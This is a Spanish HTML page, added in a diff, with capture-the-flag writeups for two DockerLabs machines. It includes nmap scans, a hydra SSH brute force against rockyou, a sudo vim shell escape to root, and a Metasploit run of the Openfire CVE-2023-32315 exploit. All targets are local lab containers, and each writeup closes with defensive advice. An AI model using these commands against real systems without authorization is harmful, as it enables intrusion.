@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>DockerLabs Writeups | R1sk1s</title>
+    <link rel="stylesheet" href="../styles/main.css">
+    <style>
+        /* Estilos adicionales para writeups */
+        .writeup-full {
+            background: #1a1a1a;
+            padding: 25px;
+            border-radius: 5px;
+            margin-bottom: 30px;
+        }
+        pre {
+            background: #0f0f0f;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        code {
+            color: #4CAF50;
+            font-family: 'Courier New', monospace;
+        }
+        .section-title {
+            color: #4CAF50;
+            margin-top: 25px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>R1sk1s</h1>
+        <p>Red Team</p>
+        <nav>
+            <a href="../index.html">Inicio</a>
+            <!--<a href="../htb.html">HackTheBox</a>-->
+            <a href="../about.html">Sobre Mí</a>
+        </nav>
+    </header>
+
+    <main>
+        <h1>DockerLabs Writeups</h1>
+        
+        <!-- Máquina Trust -->
+        <article id="trust" class="writeup-full">
+            <h2>Trust</h2>
+            <p class="date">28 Mar 2025 | Dificultad: Fácil</p>
+            
+            <h3 class="section-title">1. Recolección de Información</h3>
+            <h4>Escaneo con Nmap</h4>
+            <pre><code>nmap -sS -sCV --open --min-rate 5000 -p- 172.18.0.2 -oN tcp_scan</code></pre>
+            <img src="assets/images/trust/trust_nmap.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <p><strong>Resultados:</strong> Puertos abiertos: 22 (SSH), 80 (HTTP).</p>
+            
+            <h4>Enumeración Web</h4>
+            <p>Acceso al servicio HTTP:</p>
+            <pre><code>http://172.18.0.2:80</code></pre>
+            <img src="assets/images/trust/trust_web_apache.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+
+            <h4>DirBuster</h4>
+            <p>Configuración usada:</p>
+            <ul>
+                <li>Wordlist: <code>directory-list-2.3-medium.txt</code></li>
+                <li>Archivo crítico encontrado: <code>secret.php</code></li>
+            </ul>
+            <img src="assets/images/trust/trust_dirbuster.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_dirbuster_2.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+
+            <p>Contenido de secret.php:</p>
+            <blockquote>Hola Mario,<br>Esta web no se puede hackear.</blockquote>
+            <img src="assets/images/trust/trust_secretphp.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+
+            <h3 class="section-title">2. Explotación</h3>
+            <h4>Fuerza Bruta con Hydra</h4>
+            <pre><code>hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2</code></pre>
+            <img src="assets/images/trust/trust_hydra.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <p><strong>Credenciales obtenidas:</strong> Usuario: <code>mario</code> | Contraseña: <code>chocolate</code></p>
+            
+            <h4>Acceso por SSH</h4>
+            <pre><code>ssh mario@172.18.0.2</code></pre>
+            <img src="assets/images/trust/trust_ssh.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            
+            <h3 class="section-title">3. Escalada de Privilegios</h3>
+            <h4>Verificación de permisos Sudo</h4>
+            <pre><code>sudo -l</code></pre>
+            <img src="assets/images/trust/trust_sudo_-l.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <p><strong>Resultado:</strong> Permiso para ejecutar <code>/usr/bin/vim</code> como root.</p>
+            
+            <h4>Abuso de Vim (GTFOBins)</h4>
+            <pre><code>sudo /usr/bin/vim
+:!/bin/sh  # Dentro de Vim
+whoami  # Output: root</code></pre>
+            <img src="assets/images/trust/trust_vim.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_root.PNG" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+
+            <h3 class="section-title">4. Conclusión</h3>
+            <ul>
+                <li>Vulnerabilidad crítica: Contraseña débil en SSH.</li>
+                <li>Recomendación: Restringir permisos de sudo y usar autenticación por claves.</li>
+            </ul>
+        </article>
+
+        <!-- Máquina Chocolatefire -->
+    <article id="chocolatefire" class="writeup-full">
+        <h2>Chocolatefire</h2>
+        <p class="date">29 Mar 2025 | Dificultad: Media</p>
+    
+        <h3 class="section-title">1. Recolección de Información</h3>
+        <h4>Escaneo Inicial (Nmap)</h4>
+        <pre><code>nmap -sS --open --min-rate 5000 -p- 172.17.0.2 -oN OnlyP.txt</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_nmap_initial.PNG" alt="Resultado Nmap inicial" style="max-width: 100%; border: 1px solid #333;">
+        <p><strong>Resultados:</strong> Puertos abiertos: 22 (SSH), 5222-5276 (XMPP), 7070 (RealServer), 7777 (CBT), 9090 (Openfire).</p>
+    
+        <h4>Escaneo Profundo</h4>
+        <pre><code>nmap -sS -sCV -p22,5222,5223,5262,5263,5269,5270,5275,5276,7070,7777,9090 172.17.0.2 -oN fullinfo.txt</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_nmap_full1.PNG" alt="Resultado Nmap completo" style="max-width: 100%; border: 1px solid #333;">
+        <img src="assets/images/chocolatefire/chocolatefire_nmap_full2.PNG" alt="Resultado Nmap completo" style="max-width: 100%; border: 1px solid #333;">
+        <p><strong>Servicio crítico:</strong> Openfire 4.7.4 en puerto 9090.</p>
+
+        <h4>Inspección Web</h4>
+        <p>Acceso al panel de Openfire:</p>
+        <pre><code>http://172.17.0.2:9090</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_navegador.PNG" alt="Panel Openfire" style="max-width: 100%; border: 1px solid #333;">
+
+        <h3 class="section-title">2. Explotación</h3>
+        <h4>Búsqueda de Vulnerabilidades</h4>
+        <pre><code>searchsploit openfire 4.7.4</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_searchsploit.PNG" alt="Resultado Searchsploit" style="max-width: 100%; border: 1px solid #333;">
+        <p><strong>Vulnerabilidad seleccionada:</strong> CVE-2023-32315 (Auth Bypass + RCE).</p>
+
+        <h4>Configuración de Metasploit</h4>
+        <p>Acceso a la terminal de metasploit con el siguiente comando.</p>
+        <pre><code>sudo msfconsole</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_metasploit_console.PNG" alt="Acceso a la consola de metasploit" style="max-width: 100%; border: 1px solid #333;">
+        <p>Uso del comando search para encontar los scipts que tiene metasploit para este servicio en concreto</p>
+        <pre><code>search openfire</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_metasploit_search.PNG" alt="Resultado Search" style="max-width: 100%; border: 1px solid #333;">
+        <p>Seleccionamos el exploit que queremos utilizar de la lista que vemos en la imágen anterior, en este caso usaremos el cuarto exploit.</p>
+        <pre><code>msf6 > use 4</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_use_4.PNG" alt="Selección de exploit" style="max-width: 100%; border: 1px solid #333;">
+        <p>Configuramos las opciones que necesitamos para que el exploit funcione.</p>
+        <pre><code>msf6 > set RHOSTS 172.17.0.2
+msf6 > set RPORT 9090
+msf6 > run</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_options.PNG" alt="Configuración Metasploit" style="max-width: 100%; border: 1px solid #333;">
+
+        <h4>Ejecución del Exploit</h4>
+        <p>Ejecutaremos el exploit que hemos configurado con el comando run.</p>
+        <img src="assets/images/chocolatefire/chocolatefire_run.PNG" alt="Ejecución del exploit" style="max-width: 100%; border: 1px solid #333;">
+        <p><strong>Credenciales creadas:</strong></p>
+        <ul>
+            <li>Usuario: <code>tyxkysgpmdwao1</code></li>
+            <li>Contraseña: <code>C20ydkfZg8</code></li>
+        </ul>
+
+        <h3 class="section-title">3. Escalada de Privilegios</h3>
+        <h4>Verificación de Acceso</h4>
+        <pre><code>id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root</code></pre>
+        <img src="assets/images/chocolatefire/chocolatefire_root.PNG" alt="Shell como root" style="max-width: 100%; border: 1px solid #333;">
+        <p>En este caso como ya conseguimos una shell como root no necesitaremos escalar privilegios.</p>
+
+        <h3 class="section-title">4. Conclusión</h3>
+        <ul>
+            <li><strong>Vulnerabilidad crítica:</strong> Autenticación vulnerable en Openfire 4.7.4</li>
+            <li><strong>Recomendaciones:</strong>
+                <ul>
+                    <li>Actualizar Openfire a la última versión</li>
+                    <li>Implementar reglas de firewall para restringir acceso al panel administrativo</li>
+                </ul>
+            </li>
+        </ul>
+    </article>
+    </main>
+
+    <footer>
+        <p>© 2025 R1sk1s | <a href="coedovillabryan.it@gmail.com">Contacto</a></p>
+    </footer>
+</body>
+</html>
